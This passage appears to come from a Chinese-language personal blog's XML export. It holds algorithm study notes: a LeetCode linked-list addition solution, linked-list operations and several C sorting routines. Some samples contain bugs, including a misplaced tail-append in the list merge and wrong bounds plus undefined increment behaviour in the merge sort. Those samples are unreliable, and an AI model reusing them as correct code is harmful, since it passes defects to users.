class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">            sb.append(j);</span><br><span class="line">            dfs(n, i + <span class="number">1</span>, sb);</span><br><span class="line">            <span class="keyword">if</span> (sb.length() != <span class="number">0</span>) &#123;</span><br><span class="line">                sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用链表实现大数相加"><a href="#利用链表实现大数相加" class="headerlink" title="利用链表实现大数相加"></a>利用链表实现大数相加</h2><h3 id="leetcode2-两数相加"><a href="#leetcode2-两数相加" class="headerlink" title="leetcode2 两数相加"></a>leetcode2 两数相加</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。</p>
<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>注意是逆序存储，考虑进位即可。</p>
<p>如果是正序，可以先原地反转链表。</p>
<h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode p = l1, q = l2; <span class="comment">// 原链表的两个遍历指针</span></span><br><span class="line">        ListNode resultHead = <span class="keyword">new</span> ListNode(-<span class="number">1</span>); <span class="comment">// 结果链表的头结点head</span></span><br><span class="line">        ListNode curr = resultHead; <span class="comment">// 结果链表的遍历指针，代表当前操作的节点</span></span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>; <span class="comment">// 进位</span></span><br><span class="line">        <span class="comment">// 1.遍历两个链表</span></span><br><span class="line">        <span class="keyword">while</span> (p != <span class="keyword">null</span> || q != <span class="keyword">null</span>) &#123; <span class="comment">// 以⻓链表为准</span></span><br><span class="line">            <span class="comment">// 获取当前节点的值：链表较短，已⽆节点，取0</span></span><br><span class="line">            <span class="keyword">int</span> x = p != <span class="keyword">null</span> ? p.val : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> y = q != <span class="keyword">null</span> ? q.val : <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 2.对应位置的节点数值相加</span></span><br><span class="line">            <span class="keyword">int</span> sum = x + y + carry;</span><br><span class="line">            carry = sum / <span class="number">10</span>; <span class="comment">// 如何得到进位：和对10求整，得到此次计算的进位</span></span><br><span class="line">            <span class="keyword">int</span> num = sum % <span class="number">10</span>; <span class="comment">// 存放到新链表节点中的数值</span></span><br><span class="line">            <span class="comment">// 3.将计算结果插⼊新链表尾部</span></span><br><span class="line">            curr.next = <span class="keyword">new</span> ListNode(num); <span class="comment">// 创建新节点</span></span><br><span class="line">            curr = curr.next;</span><br><span class="line">            p = p == <span class="keyword">null</span> ? p : p.next;</span><br><span class="line">            q = q == <span class="keyword">null</span> ? q : q.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (carry &gt; <span class="number">0</span>) &#123; <span class="comment">// 处理进位节点</span></span><br><span class="line">            curr.next = <span class="keyword">new</span> ListNode(carry);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据经典论文解读</title>
    <url>/2021/09/23/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%8F%E5%85%B8%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p>切勿浮沙筑高台</p>
<p><a href="https://time.geekbang.org/column/article/418468?cid=100091101">参考链接1</a></p>
<p><a href="http://duanple.com/?p=170">参考链接2</a></p>
<span id="more"></span>



]]></content>
      <tags>
        <tag>Big Data</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构_note</title>
    <url>/2019/03/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-note/</url>
    <content><![CDATA[<p>数据结构真的非常重要，不光是为了应付考试，至今觉得数据结构和编译原理没有学得特别好太遗憾了，给自己做个笔记</p>
<p>结合大话数据结构以及天勤2019数据结构计算机考研复习指导</p>
<p>PS：之前学数据结构的时候直接看严蔚敏的觉得太硬核了</p>
<span id="more"></span>

<h2 id="第1章-绪论"><a href="#第1章-绪论" class="headerlink" title="第1章 绪论"></a>第1章 绪论</h2><p>具体是啥翻书，记录一下常用的<br>$$<br>O(1) &lt;= O(log<del>2(n)) &lt;= O(n) &lt;= O(nlog</del>2(n)) &lt;= O(n^2) &lt;= O(n^3) &lt;= O(2^n)<br>$$</p>
<h2 id="第2章-线性表"><a href="#第2章-线性表" class="headerlink" title="第2章 线性表"></a>第2章 线性表</h2><h3 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h3><p>定义：具有相同特性数据元素的一个有限序列，长度为元素个数</p>
<p>存储结构：顺序存储结构（顺序表）；链式存储结构（链表）</p>
<p>存储密度：结点值域所占存储量/节点结构所占存储量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">顺序表：存储需要一块连续的存储空间，有随机访问特性，便于查找，可以随机存取以及顺序存取</span><br><span class="line">链表：每个节点还需要包含逻辑关系信息，比如前驱和后继的地址，不需要连续的存储空间，可以动态分配，但没有随机访问特性，而且因为要存储地址信息，所以利用率低，便于插入，采取顺序存取</span><br></pre></td></tr></table></figure>

<h3 id="线性表结构定义"><a href="#线性表结构定义" class="headerlink" title="线性表结构定义"></a>线性表结构定义</h3><p>最常见的基本结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxSize 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个顺序表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> data[maxSize];  <span class="comment">//存放顺序表元素数组</span></span><br><span class="line">	<span class="keyword">int</span> length;  <span class="comment">//存放顺序表长度</span></span><br><span class="line">&#125;Sqlist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个单链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> data;  <span class="comment">//存放数据</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>  <span class="comment">//存放下一个节点的地址</span></span><br><span class="line">&#125;LNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个双向链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DLNode</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DLNode</span> *<span class="title">prior</span>;</span>  <span class="comment">//前驱结点的指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DLNode</span> *<span class="title">next</span>;</span>  <span class="comment">//后继结点的指针</span></span><br><span class="line">&#125;DLNode;</span><br></pre></td></tr></table></figure>

<h3 id="顺序表操作"><a href="#顺序表操作" class="headerlink" title="顺序表操作"></a>顺序表操作</h3><p>插入元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为顺序表有序</span><br><span class="line">第一步：找到位置</span><br><span class="line">第二步：移动元素</span><br></pre></td></tr></table></figure>

<p>删除元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到下表，删（向前移动）就完事了</span><br></pre></td></tr></table></figure>

<h3 id="单链表操作"><a href="#单链表操作" class="headerlink" title="单链表操作"></a>单链表操作</h3><p>[例1]已知A、B两个含有头结点的递增链表，并成一个元素非递减有序的链表</p>
<p>注：int *&amp;p 定义一个指针引用,既可以改变指针指向的内容,也可以改变指针本身;</p>
<p>​    int *q 定义一个指针,可以改变指针指向的内容,但无法改变指针本身</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//有序自增链表合并(合并后为自增)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(LNode *A, LNode *B, LNode *&amp;C)</span> </span>&#123;</span><br><span class="line">	LNode *p = A-&gt;next;  <span class="comment">//指向第一个有数值的结点</span></span><br><span class="line">	LNode *q = B-&gt;next;</span><br><span class="line">	LNode *r;  <span class="comment">//指向C的终端结点</span></span><br><span class="line">	C = A;</span><br><span class="line">	C-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">free</span>(B);  <span class="comment">//B的头结点已经没有用了，防止UAF</span></span><br><span class="line">	r = C;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span> &amp;&amp; q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;data &lt;= q-&gt;data) &#123;</span><br><span class="line">			r-&gt;next = p;</span><br><span class="line">			p = p-&gt;next;</span><br><span class="line">			r = r-&gt;next;  <span class="comment">//尾插法</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			r-&gt;next = q;</span><br><span class="line">			q = q-&gt;next;</span><br><span class="line">			r = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">			r-&gt;next = p;</span><br><span class="line">		<span class="keyword">if</span> (q != <span class="literal">NULL</span>)</span><br><span class="line">			r-&gt;next = q;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>[例2]查找链表中是否存在元素值为x的结点，有的话就删了，返还1，否则返还0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查找元素值并删除该结点</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findAndDelete</span><span class="params">(LNode *C, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	LNode *p, *q;</span><br><span class="line">	p = C;</span><br><span class="line">	<span class="comment">//开始查找</span></span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;next-&gt;data == x)</span><br><span class="line">			<span class="keyword">break</span>;  <span class="comment">//找到了</span></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//没找到</span></span><br><span class="line">	<span class="comment">//开始删除结点</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		q = p-&gt;next;</span><br><span class="line">		p-&gt;next = p-&gt;next-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(q);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">//完成删除</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚开始还是比较容易的，暗自窃喜</p>
<h3 id="双链表操作"><a href="#双链表操作" class="headerlink" title="双链表操作"></a>双链表操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//建立双向链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createDlistR</span><span class="params">(DLNode *&amp;L, <span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	DLNode *s, *r;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	L = (DLNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DLNode));</span><br><span class="line">	L-&gt;prior = <span class="literal">NULL</span>;</span><br><span class="line">	L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	r = L;  <span class="comment">//尾插法</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		s = (DLNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DLNode));  <span class="comment">//创建一个新结点</span></span><br><span class="line">		s-&gt;data = a[i];</span><br><span class="line">		r-&gt;next = s;</span><br><span class="line">		s-&gt;prior = r;</span><br><span class="line">		r = s;</span><br><span class="line">	&#125;</span><br><span class="line">	r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//双链表查找元素为某值的结点</span></span><br><span class="line"><span class="function">DLNode* <span class="title">findNode</span><span class="params">(DLNode *C, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	DLNode *p = C-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;data == x)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;  <span class="comment">//返还结点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//往双向链表插入节点</span></span><br><span class="line"><span class="comment">//略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//从双向链表删除节点</span></span><br><span class="line"><span class="comment">//略</span></span><br></pre></td></tr></table></figure>

<p>插入和删除没必要详细些，无非就是单链表拆卸转向双链表拆卸，unlink的操作</p>
<h3 id="循环链表的操作"><a href="#循环链表的操作" class="headerlink" title="循环链表的操作"></a>循环链表的操作</h3><p>循环链表可以分为循环单链表与循环双链表，有单链表和双链表演变而来</p>
<p>总而言之，尾节点指回头结点就好了（双链表无非就是两个方向都要指）</p>
<h2 id="第七章-排序"><a href="#第七章-排序" class="headerlink" title="第七章 排序"></a>第七章 排序</h2><h3 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">直接插入排序</span></span><br><span class="line"><span class="comment">找出第一个不满足顺序排列的元素</span></span><br><span class="line"><span class="comment">在之前顺序的队列中找到自己的位置并插入</span></span><br><span class="line"><span class="comment">可能会引起越界问题，可以选择哨兵，但我不喜欢，我比较喜欢用if</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">directInsert</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> key = <span class="built_in">array</span>[n];</span><br><span class="line">	<span class="keyword">int</span> i = n;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">array</span>[i - <span class="number">1</span>] &gt; key) &#123;</span><br><span class="line">		<span class="built_in">array</span>[i] = <span class="built_in">array</span>[i - <span class="number">1</span>];</span><br><span class="line">		i--;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">array</span>[i] = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">directInsortSort</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">		directInsert(<span class="built_in">array</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">直接插入排序的改进</span></span><br><span class="line"><span class="comment">直接找到最终位置然后插入</span></span><br><span class="line"><span class="comment">这次用哨兵方便，因为要考虑下标的二分问题</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">halfinsert</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> temp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> hight = i - <span class="number">1</span>;</span><br><span class="line">		temp = <span class="built_in">array</span>[i];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (hight &gt;= low) &#123;</span><br><span class="line">			<span class="keyword">int</span> mid = (low + hight) / <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">array</span>[mid] &gt; temp) &#123;</span><br><span class="line">				hight = mid - <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				low = mid + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = i - <span class="number">1</span>; j &gt; hight; j--) &#123;</span><br><span class="line">			<span class="built_in">array</span>[j + <span class="number">1</span>] = <span class="built_in">array</span>[j];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">array</span>[hight + <span class="number">1</span>] = temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一个 so easy 的冒泡排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">array</span>[i] &gt; <span class="built_in">array</span>[i + <span class="number">1</span>]) &#123;</span><br><span class="line">			<span class="keyword">int</span> temp = <span class="built_in">array</span>[i];</span><br><span class="line">			<span class="built_in">array</span>[i] = <span class="built_in">array</span>[i+<span class="number">1</span>];</span><br><span class="line">			<span class="built_in">array</span>[i+<span class="number">1</span>] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)</span><br><span class="line">		bubble(<span class="built_in">array</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对冒泡排序的改进</span></span><br><span class="line"><span class="comment">分而治之</span></span><br><span class="line"><span class="comment">递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quick</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pivot = <span class="built_in">array</span>[high];</span><br><span class="line">	<span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">		<span class="keyword">while</span> (low &lt; high&amp;&amp;<span class="built_in">array</span>[low] &lt;= pivot) low++;</span><br><span class="line">		<span class="built_in">array</span>[high] = <span class="built_in">array</span>[low];</span><br><span class="line">		<span class="keyword">while</span> (low &lt; high&amp;&amp;<span class="built_in">array</span>[high] &gt;= pivot) high--;</span><br><span class="line">		<span class="built_in">array</span>[low] = <span class="built_in">array</span>[high];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">array</span>[low] = pivot;</span><br><span class="line">	<span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">		<span class="keyword">int</span> pivot = quick(<span class="built_in">array</span>, low, high);</span><br><span class="line">		quickSort(<span class="built_in">array</span>, low, pivot - <span class="number">1</span>);</span><br><span class="line">		quickSort(<span class="built_in">array</span>, pivot + <span class="number">1</span>, high);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一个简单的选择排序</span></span><br><span class="line"><span class="comment">每轮找一个最大的元素出来（找过的就不能找了）</span></span><br><span class="line"><span class="comment">然后交换位置</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findMaxPos</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> max = <span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (max &lt; <span class="built_in">array</span>[i]) &#123;</span><br><span class="line">			max = <span class="built_in">array</span>[i];</span><br><span class="line">			pos = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> pos = findMaxPos(<span class="built_in">array</span>, n-i);</span><br><span class="line">		<span class="keyword">int</span> temp = <span class="built_in">array</span>[pos];</span><br><span class="line">		<span class="built_in">array</span>[pos] = <span class="built_in">array</span>[n - i - <span class="number">1</span>];</span><br><span class="line">		<span class="built_in">array</span>[n - i - <span class="number">1</span>] = temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二路归并排序"><a href="#二路归并排序" class="headerlink" title="二路归并排序"></a>二路归并排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">分为n个子序表</span></span><br><span class="line"><span class="comment">两两归并</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *aid = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>((<span class="number">10</span> + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> low, <span class="keyword">int</span> mid, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> k = low; k &lt; high; k++)</span><br><span class="line">		aid[k] = <span class="built_in">array</span>[k];</span><br><span class="line">	<span class="keyword">int</span> i, j, k;</span><br><span class="line">	<span class="keyword">for</span> (i = low, j = mid + <span class="number">1</span>, k = i; i &lt; mid&amp;&amp;j &lt;= high; k++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (aid[i] &lt;= aid[j])</span><br><span class="line">			<span class="built_in">array</span>[k] = aid[i++];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">array</span>[k] = aid[j++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= mid) <span class="built_in">array</span>[i++] = aid[i++];</span><br><span class="line">	<span class="keyword">while</span> (j &lt;= high) <span class="built_in">array</span>[k++] = aid[j++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">		<span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">		mergeSort(<span class="built_in">array</span>, low, mid);</span><br><span class="line">		mergeSort(<span class="built_in">array</span>, mid + <span class="number">1</span>, high);</span><br><span class="line">		merge(<span class="built_in">array</span>, low, mid, high);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="个别算法小结"><a href="#个别算法小结" class="headerlink" title="个别算法小结"></a>个别算法小结</h2><h3 id="二叉树非递归后序遍历"><a href="#二叉树非递归后序遍历" class="headerlink" title="二叉树非递归后序遍历"></a>二叉树非递归后序遍历</h3><p>其实我个人觉得递归的逻辑很容易理解，想学习用非递归来遍历二叉树的契机是因为一道题目让我不得不学起来，因为非递归后序遍历可以很快找出二叉树中根结点到某结点之间的路径</p>
<p>非递归后序遍历应该是三种遍历中最难的了，可以一步一步来</p>
<p>先列出存储结构代码</p>
